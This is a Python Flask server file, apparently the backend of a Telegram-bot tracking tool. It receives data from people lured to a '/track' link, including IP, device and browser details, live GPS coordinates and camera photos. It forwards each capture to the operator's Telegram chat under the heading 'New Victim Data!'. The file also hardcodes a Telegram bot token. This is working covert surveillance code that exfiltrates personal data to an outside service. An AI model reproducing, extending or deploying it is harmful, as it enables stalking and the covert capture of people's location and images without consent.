from flask import Flask, request, render_template, jsonify, send_from_directory
import json
import os
import requests
import threading
import time

app = Flask(__name__, template_folder='templates', static_folder='static')

# Temporary storage (in-memory, auto-deletes)
victims_cache = {}
bot_token = "8833219234:AAEroifFsySP5SanOscHruEn8jEnRJMpm5A"  # same token as bot.py

def send_to_telegram(chat_id, data):
    """Send formatted data to Telegram bot user"""
    try:
        msg = f"🎯 *New Victim Data!*\n\n"
        msg += f"📡 *IP:* `{data.get('ip', 'N/A')}`\n"
        msg += f"📍 *IPv4:* `{data.get('ipv4', 'N/A')}`\n"
        msg += f"📍 *IPv6:* `{data.get('ipv6', 'N/A')}`\n"
        msg += f"💻 *Device:* `{data.get('device', 'N/A')}`\n"
        msg += f"🌐 *Browser:* `{data.get('browser', 'N/A')}`\n"
        msg += f"🖥 *OS:* `{data.get('os', 'N/A')}`\n"
        msg += f"📐 *Screen:* `{data.get('screen', 'N/A')}`\n"
        msg += f"🌍 *Location:* `{data.get('city', 'N/A')}, {data.get('country', 'N/A')}`\n"
        msg += f"⏰ *Time:* `{data.get('time', 'N/A')}`\n"
        
        if data.get('latitude') and data.get('longitude'):
            msg += f"\n🗺 *Live Location:*\n"
            msg += f"├ Lat: `{data['latitude']}`\n"
            msg += f"├ Lon: `{data['longitude']}`\n"
            msg += f"└ [📍 Google Maps](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
        
        if data.get('photos'):
            msg += f"\n📸 *Photos Captured:* {len(data['photos'])}\n"
            for i, photo_url in enumerate(data['photos'][:3]):
                msg += f"├ 📷 Photo {i+1}: [View]({photo_url})\n"
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": msg,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=10)
        
    except Exception as e:
        print(f"[!] Telegram send error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/track')
def track():
    """Main tracking page - victim lands here"""
    uid = request.args.get('uid', '0')
    return render_template('index.html', uid=uid)

@app.route('/api/capture', methods=['POST'])
def capture():
    """Receive data from JavaScript"""
    try:
        data = request.json
        uid = data.get('uid', '0')
        
        # Send to Telegram immediately
        send_to_telegram(uid, data)
        
        # Temporary cache with 5-min auto-delete
        victims_cache[uid] = {
            'data': data,
            'timestamp': time.time()
        }
        
        # Auto-delete after 5 minutes
        def delete_after_delay():
            time.sleep(300)
            if uid in victims_cache:
                del victims_cache[uid]
        
        threading.Thread(target=delete_after_delay, daemon=True).start()
        
        return jsonify({"status": "ok"})
    
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route('/api/upload_photo', methods=['POST'])
def upload_photo():
    """Receive photo from camera capture"""
    try:
        data = request.json
        uid = data.get('uid', '0')
        photo_data = data.get('photo', '')
        
        # Send photo to Telegram
        if photo_data:
            # Photo is base64 encoded
            files = {'photo': ('photo.jpg', photo_data)}
            url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
            payload = {'chat_id': uid}
            # Send as document to avoid compression
            resp = requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendDocument",
                files={'document': ('photo.jpg', photo_data, 'image/jpeg')},
                data={'chat_id': uid}
            )
        
        return jsonify({"status": "ok"})
    
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route('/api/location', methods=['POST'])
def location():
    """Receive live GPS location"""
    try:
        data = request.json
        uid = data.get('uid', '0')
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if lat and lon:
            msg = f"📍 *Live Location Update!*\n\n"
            msg += f"├ Lat: `{lat}`\n"
            msg += f"├ Lon: `{lon}`\n"
            msg += f"└ [View on Google Maps](https://www.google.com/maps?q={lat},{lon})\n"
            msg += f"\n📱 *Accuracy:* {data.get('accuracy', 'N/A')}m"
            
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                "chat_id": uid,
                "text": msg,
                "parse_mode": "Markdown"
            }
            requests.post(url, json=payload, timeout=10)
        
        return jsonify({"status": "ok"})
    
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
